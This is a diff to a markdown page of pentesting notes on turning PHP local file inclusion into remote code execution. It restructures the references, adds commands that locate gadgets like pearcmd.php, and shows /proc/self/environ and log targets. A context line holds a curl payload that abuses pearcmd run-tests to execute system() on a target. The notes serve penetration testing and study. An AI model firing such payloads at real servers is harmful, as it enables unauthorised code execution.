@@ -31,14 +31,18 @@
 
 [https://hackmd.io/@LightSheng/ByrFtyaQp](https://hackmd.io/@LightSheng/ByrFtyaQp)<br>
 
-## Check Php Gadget
+## Find PHP Gadgets
 
+```bash
+docker compose up -d
+docker compose exec app sh -lc 'find / -name "*.php" 2>/dev/null | head -100'
 ```
-# deploy local with docker compose
 
-# after that on the terminal container
-
-find -name "*.php"
+```text
+/usr/local/lib/php/pearcmd.php
+/usr/local/lib/php/peclcmd.php
+/var/log/nginx/access.log
+/proc/self/environ
 ```
 
 ## Bypass
@@ -106,20 +110,10 @@ curl "http://TARGET/?+run-tests+-i+-r\"system(hex2bin('$(printf %s "$cmd" | xxd 
 
 ## LFI2RCE via php filter chain
 
-{% content-ref url="php.md" %}
-[php.md](php.md)
-{% endcontent-ref %}
+Use [PHP](php.md) for wrappers, filter chains, and webshell variants.
 
-## Links
+## References
 
-Detailed lfi2rce
-
-{% embed url="https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html" %}
-
-Adv payload, pearcmd
-
-{% embed url="https://hackmd.io/@LightSheng/ByrFtyaQp" %}
-
-Log poisoning, basics payload
-
-{% embed url="https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet" %}
+* [HackTricks LFI](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html)
+* [Advanced pearcmd notes](https://hackmd.io/@LightSheng/ByrFtyaQp)
+* [LFI RCE Cheat Sheet](https://github.com/RoqueNight/LFI---RCE-Cheat-Sheet)
